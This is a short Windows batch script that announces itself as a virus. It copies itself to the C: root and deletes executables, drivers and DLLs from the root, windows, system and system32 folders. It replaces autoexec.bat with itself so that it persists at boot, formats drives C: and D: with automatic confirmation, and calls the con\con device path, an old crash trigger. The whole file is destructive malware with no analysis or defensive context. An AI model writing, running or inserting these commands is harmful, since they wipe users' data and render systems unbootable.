copy sharka.bat c:\
c:
cd\
del *.com
del *.exe
del autoexec.bat
cd windows
del *.sys
del *.exe
del *.dll
cd system
del *.sys
del *.exe
del *.dll
cd..
cd system32
del *.sys
del *.exe
del *.dll
ren c:\sharka.bat autoexec.bat
Echo y | format c:
Echo y | format d:
ECHO        The virus has been installed on this computer!
pause
c:\windows\con\con
d:\windows\con\con